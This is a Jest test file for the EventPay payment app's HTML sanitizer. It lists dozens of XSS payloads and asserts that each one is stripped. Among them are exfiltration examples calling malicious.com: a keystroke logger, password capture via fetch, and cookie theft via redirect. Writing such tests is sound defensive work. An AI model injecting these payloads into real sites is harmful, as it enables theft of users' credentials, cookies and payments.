import { sanitizeForEventPay, sanitizeEventDescription } from "@/lib/utils/sanitize";

// EventPay特化・包括的XSSペイロード
const COMPREHENSIVE_XSS_PAYLOADS = [
  // 基本的なスクリプト注入
  '<script>alert("XSS")</script>',
  '<script type="text/javascript">alert("XSS")</script>',
  '<script language="javascript">alert("XSS")</script>',

  // イベントハンドラ注入
  '<img src=x onerror=alert("XSS")>',
  '<img src="x" onerror="alert(1)">',
  '<body onload=alert("XSS")>',
  "<div onclick=\"alert('XSS')\">click</div>",
  "<input onfocus=\"alert('XSS')\" autofocus>",
  "<select onfocus=alert(1) autofocus>",
  "<textarea onfocus=alert(1) autofocus>",

  // SVG/XML攻撃
  '<svg onload=alert("XSS")>',
  '<svg><script>alert("XSS")</script></svg>',
  '<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"/>',

  // CSS悪用
  "<style>body{background:url(\"javascript:alert('XSS')\")}</style>",
  "<div style=\"background:url(javascript:alert('XSS'))\">",
  "<style>@import \"javascript:alert('XSS')\";</style>",
  '<link rel="stylesheet" href="javascript:alert(1)">',

  // プロトコル悪用（HTMLコンテキストでの攻撃）
  "<a href=\"javascript:alert('XSS')\">click</a>",
  "<img src=\"data:text/html,<script>alert('XSS')</script>\">",
  "<iframe src=\"vbscript:alert('XSS')\">",

  // フレーム/オブジェクト埋め込み
  '<iframe src="javascript:alert(1)">',
  '<object data="javascript:alert(1)">',
  '<embed src="javascript:alert(1)">',
  '<applet code="javascript:alert(1)">',

  // エンコーディング回避
  '&lt;script&gt;alert("XSS")&lt;/script&gt;',
  '%3Cscript%3Ealert("XSS")%3C/script%3E',
  '&#60;script&#62;alert("XSS")&#60;/script&#62;',
  '\u003cscript\u003ealert("XSS")\u003c/script\u003e',

  // DOM Clobbering
  '<form><input name="attributes"><input name="attributes">',
  '<img name="getElementsByTagName">',
  '<form name="createElement">',

  // 高度なXSS攻撃パターン（EventPay決済セキュリティ特化）
  '<meta http-equiv="refresh" content="0;url=javascript:alert(1)">',
  '<base href="javascript:alert(1)//">',
  '<isindex action="javascript:alert(1)">',
  '<form action="javascript:alert(1)">',

  // 難読化・エンコード攻撃
  '<script>/**/alert("XSS")</script>',
  '<img src="x" onerror="eval(atob(\'YWxlcnQoJ1hTUycpOw==\'))">',
  '<div onmouseover="alert(String.fromCharCode(88,83,83))">',
];

// CSPポリシー回避攻撃パターン
const CSP_BYPASS_PAYLOADS = [
  // CSP nonce回避試行
  '<script nonce="fake-nonce">alert("CSP bypass")</script>',
  '<script nonce="">alert("Empty nonce")</script>',

  // CSP unsafe-inline回避試行
  '<style>@import "data:text/css,body{background:url(javascript:alert(1))}"</style>',
  '<link rel="stylesheet" href="data:text/css,body{background:url(javascript:alert(1))}">',

  // CSP script-src回避試行
  '<script src="data:text/javascript,alert(1)"></script>',
  '<script>eval("alert(1)")</script>',
  '<script>new Function("alert(1)")()</script>',

  // CSP object-src回避試行
  '<object data="data:text/html,<script>alert(1)</script>"></object>',
  '<object type="text/html" data="javascript:alert(1)"></object>',

  // CSP frame-src回避試行
  '<iframe srcdoc="<script>alert(1)</script>"></iframe>',
  '<iframe src="data:text/html,<script>alert(1)</script>"></iframe>',

  // CSP form-action回避試行
  '<form action="javascript:alert(1)"><input type="submit"></form>',
  '<form action="data:text/html,<script>alert(1)</script>"></form>',
];

// 決済システム特化のXSS攻撃パターン
const PAYMENT_SPECIFIC_XSS_PAYLOADS = [
  // 決済フォーム改ざん攻撃
  '<input type="hidden" name="amount" value="javascript:alert(1)">',
  '<form action="https://malicious.com/steal-payment">',
  '<input type="submit" value="決済する" onclick="alert(\'payment hijacked\')">',
  '<script src="https://malicious.com/fake-stripe.js"></script>',
  '<input data-stripe="javascript:alert(1)">',
  "<input type=\"password\" onchange=\"fetch('https://malicious.com/steal', {method: 'POST', body: this.value})\">",

  // キーロガー・情報窃取攻撃
  "<script>document.addEventListener('keypress', e=>fetch('https://malicious.com/keylog', {method: 'POST', body: e.key}))</script>",
];

// Phase 3追加: 高度なXSS攻撃パターン
const ADVANCED_XSS_PAYLOADS = [
  // Mutation XSS
  '<div id="test"></div><script>document.getElementById("test").innerHTML="<img src=x onerror=alert(1)>"</script>',

  // Template injection
  "<template><script>alert(1)</script></template>",
  '<template id="t"><img src=x onerror=alert(1)></template><script>document.body.appendChild(document.getElementById("t").content)</script>',

  // Shadow DOM XSS
  '<div id="shadow"></div><script>document.getElementById("shadow").attachShadow({mode:"open"}).innerHTML="<img src=x onerror=alert(1)>"</script>',

  // Web Components XSS
  '<script>customElements.define("x-xss", class extends HTMLElement{connectedCallback(){this.innerHTML="<img src=x onerror=alert(1)>"}})</script><x-xss></x-xss>',

  // Service Worker XSS
  "<script>navigator.serviceWorker.register(\"data:text/javascript,self.addEventListener('message',e=>eval(e.data))\")</script>",

  // WebAssembly XSS
  "<script>WebAssembly.instantiate(new Uint8Array([0,97,115,109,1,0,0,0,1,4,1,96,0,0,3,2,1,0,7,9,1,5,97,108,101,114,116,0,0,10,8,1,6,0,65,49,16,0,11]))</script>",
];

describe("EventPay包括的XSSセキュリティテスト（Phase3強化版）", () => {
  describe("sanitizeForEventPay - 基本XSS攻撃防止", () => {
    COMPREHENSIVE_XSS_PAYLOADS.forEach((payload, index) => {
      it(`包括的XSS攻撃パターン ${index + 1} を防ぐ: ${payload.substring(0, 50)}...`, () => {
        const result = sanitizeForEventPay(payload);

        // 危険なタグ・属性が完全に除去されていることを確認
        expect(result).not.toMatch(/<script[\s\S]*?>/i);
        expect(result).not.toMatch(/on\w+\s*=/i);
        expect(result).not.toMatch(/<style[\s\S]*?>/i);
        expect(result).not.toMatch(/<iframe[\s\S]*?>/i);
        expect(result).not.toMatch(/<object[\s\S]*?>/i);
        expect(result).not.toMatch(/<embed[\s\S]*?>/i);
        expect(result).not.toMatch(/<applet[\s\S]*?>/i);
        expect(result).not.toMatch(/<meta[\s\S]*?>/i);
        expect(result).not.toMatch(/<base[\s\S]*?>/i);
        expect(result).not.toMatch(/<form[\s\S]*?>/i);
        expect(result).not.toMatch(/<link[\s\S]*?>/i);

        // 結果が文字列であることを確認
        expect(typeof result).toBe("string");
      });
    });
  });

  describe("Phase 3追加: CSPポリシー回避攻撃防止", () => {
    CSP_BYPASS_PAYLOADS.forEach((payload, index) => {
      it(`CSP回避攻撃パターン ${index + 1} を防ぐ: ${payload.substring(0, 50)}...`, () => {
        const result = sanitizeForEventPay(payload);

        // CSP回避攻撃が完全に無効化されていることを確認
        expect(result).not.toMatch(/<script[\s\S]*?>/i);
        expect(result).not.toMatch(/nonce\s*=/i);
        expect(result).not.toMatch(/<style[\s\S]*?>/i);
        expect(result).not.toMatch(/<link[\s\S]*?>/i);
        expect(result).not.toMatch(/<object[\s\S]*?>/i);
        expect(result).not.toMatch(/<iframe[\s\S]*?>/i);
        expect(result).not.toMatch(/srcdoc\s*=/i);
        expect(result).not.toMatch(/data:text\/html/i);
        expect(result).not.toMatch(/javascript:/i);
        expect(result).not.toMatch(/eval\s*\(/i);
        expect(result).not.toMatch(/Function\s*\(/i);

        // 結果が文字列であることを確認
        expect(typeof result).toBe("string");
      });
    });
  });

  describe("Phase 3追加: 高度なXSS攻撃防止", () => {
    ADVANCED_XSS_PAYLOADS.forEach((payload, index) => {
      it(`高度なXSS攻撃パターン ${index + 1} を防ぐ: ${payload.substring(0, 50)}...`, () => {
        const result = sanitizeForEventPay(payload);

        // 高度なXSS攻撃が完全に無効化されていることを確認
        expect(result).not.toMatch(/<script[\s\S]*?>/i);
        expect(result).not.toMatch(/<template[\s\S]*?>/i);
        expect(result).not.toMatch(/attachShadow/i);
        expect(result).not.toMatch(/customElements/i);
        expect(result).not.toMatch(/serviceWorker/i);
        expect(result).not.toMatch(/WebAssembly/i);
        expect(result).not.toMatch(/innerHTML\s*=/i);
        expect(result).not.toMatch(/eval\s*\(/i);

        // 結果が文字列であることを確認
        expect(typeof result).toBe("string");
      });
    });
  });

  describe("sanitizeForEventPay - 決済特化XSS攻撃防止", () => {
    PAYMENT_SPECIFIC_XSS_PAYLOADS.forEach((payload, index) => {
      it(`決済特化XSS攻撃パターン ${index + 1} を防ぐ: ${payload.substring(0, 50)}...`, () => {
        const result = sanitizeForEventPay(payload);

        // 危険なタグ・属性が完全に除去されていることを確認
        expect(result).not.toMatch(/<script[\s\S]*?>/i);
        expect(result).not.toMatch(/on\w+\s*=/i);
        expect(result).not.toMatch(/<input[\s\S]*?>/i);
        expect(result).not.toMatch(/<form[\s\S]*?>/i);

        // 結果が文字列であることを確認
        expect(typeof result).toBe("string");
      });
    });
  });

  describe("sanitizeEventDescription - 改行保持XSS攻撃防止", () => {
    it("改行を保持しながらXSS攻撃を防ぐ", () => {
      const maliciousInput = `
        <script>alert("XSS")</script>
        正常なイベント説明
        <img src="x" onerror="alert(1)">
        改行を含む説明文
        <div onclick="alert(1)">クリック</div>
      `;

      const result = sanitizeEventDescription(maliciousInput);

      // 改行は保持される
      expect(result).toContain("\n");

      // 危険なタグは除去される
      expect(result).not.toContain("<script>");
      expect(result).not.toContain("onerror");
      expect(result).not.toContain("onclick");

      // 正常なテキストは保持される
      expect(result).toContain("正常なイベント説明");
      expect(result).toContain("改行を含む説明文");
    });
  });

  describe("エッジケース・極限テスト", () => {
    it("非常に長い入力でも安全に処理される", () => {
      const longMaliciousInput = '<script>alert("XSS")</script>'.repeat(1000);
      const result = sanitizeForEventPay(longMaliciousInput);

      expect(result).not.toContain("<script>");
      expect(result).not.toContain("alert");
      expect(typeof result).toBe("string");
    });

    it("ネストされた攻撃パターンを防ぐ", () => {
      const nestedAttack =
        '<div><script>alert("XSS")</script><img src="x" onerror="alert(1)"></div>';
      const result = sanitizeForEventPay(nestedAttack);

      expect(result).not.toContain("<script>");
      expect(result).not.toContain("onerror");
      expect(result).not.toContain("alert");
    });

    it("空文字・null・undefinedを適切に処理", () => {
      expect(sanitizeForEventPay("")).toBe("");
      // @ts-expect-error Testing null input handling
      expect(sanitizeForEventPay(null)).toBe("");
      // @ts-expect-error Testing undefined input handling
      expect(sanitizeForEventPay(undefined)).toBe("");
    });

    it("正常なテキストは変更されない", () => {
      const normalText = "EventPay年末パーティー 2024年12月31日 東京都渋谷区";
      const result = sanitizeForEventPay(normalText);

      expect(result).toBe(normalText);
    });

    it("Unicode文字を適切に処理", () => {
      const unicodeText = "🎉 EventPay新年会 🎊 参加費: ¥3,000";
      const result = sanitizeForEventPay(unicodeText);

      expect(result).toBe(unicodeText);
    });
  });

  describe("EventPay実環境シミュレーション", () => {
    it("イベントタイトルでの攻撃を防ぐ", () => {
      const maliciousTitle =
        '<script>fetch("/api/payments", {method: "DELETE"})</script>年末パーティー';
      const result = sanitizeForEventPay(maliciousTitle);

      expect(result).toBe("年末パーティー");
      expect(result).not.toContain("fetch");
      expect(result).not.toContain("DELETE");
    });

    it("イベント場所での攻撃を防ぐ", () => {
      const maliciousLocation =
        "東京都<img src=x onerror=\"location.href='https://malicious.com'\">渋谷区";
      const result = sanitizeForEventPay(maliciousLocation);

      expect(result).toBe("東京都渋谷区");
      expect(result).not.toContain("onerror");
      expect(result).not.toContain("location.href");
    });

    it("複合攻撃パターンを完全に防御", () => {
      const complexAttack = `
        <script>
          // EventPay APIを悪用した攻撃
          fetch('/api/payments', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({amount: 999999})
          });
        </script>
        <img src="x" onerror="
          document.cookie='session=hijacked';
          window.location='https://malicious.com/steal?cookie='+document.cookie;
        ">
        正常なイベント情報
      `;

      const result = sanitizeForEventPay(complexAttack);

      // 攻撃コードは完全に除去
      expect(result).not.toContain("fetch");
      expect(result).not.toContain("api/payments");
      expect(result).not.toContain("document.cookie");
      expect(result).not.toContain("window.location");
      expect(result).not.toContain("onerror");

      // 正常なテキストは保持
      expect(result).toContain("正常なイベント情報");
    });
  });

  describe("Phase 3追加: パフォーマンス・セキュリティ統合テスト", () => {
    it("大量のCSP回避攻撃パターンを効率的に処理", () => {
      const startTime = performance.now();

      CSP_BYPASS_PAYLOADS.forEach((payload) => {
        const result = sanitizeForEventPay(payload);
        expect(result).not.toMatch(/<script[\s\S]*?>/i);
        expect(result).not.toMatch(/javascript:/i);
      });

      const endTime = performance.now();
      const executionTime = endTime - startTime;

      // 処理時間が合理的な範囲内であることを確認（100ms以下）
      expect(executionTime).toBeLessThan(100);
    });

    it("高度なXSS攻撃パターンのメモリ効率的処理", () => {
      ADVANCED_XSS_PAYLOADS.forEach((payload) => {
        const result = sanitizeForEventPay(payload);
        expect(result).not.toMatch(/<script[\s\S]*?>/i);
        expect(result).not.toMatch(/eval\s*\(/i);
        expect(result).not.toMatch(/WebAssembly/i);
        expect(typeof result).toBe("string");
      });
    });

    it("決済特化攻撃パターンの包括的防御", () => {
      const combinedPaymentAttack = PAYMENT_SPECIFIC_XSS_PAYLOADS.join("\n");
      const result = sanitizeForEventPay(combinedPaymentAttack);

      expect(result).not.toContain("fetch");
      expect(result).not.toContain("XMLHttpRequest");
      expect(result).not.toContain("addEventListener");
      expect(result).not.toContain("onerror");
      expect(result).not.toContain("onchange");
      expect(result).not.toContain("data-stripe");
    });
  });
});
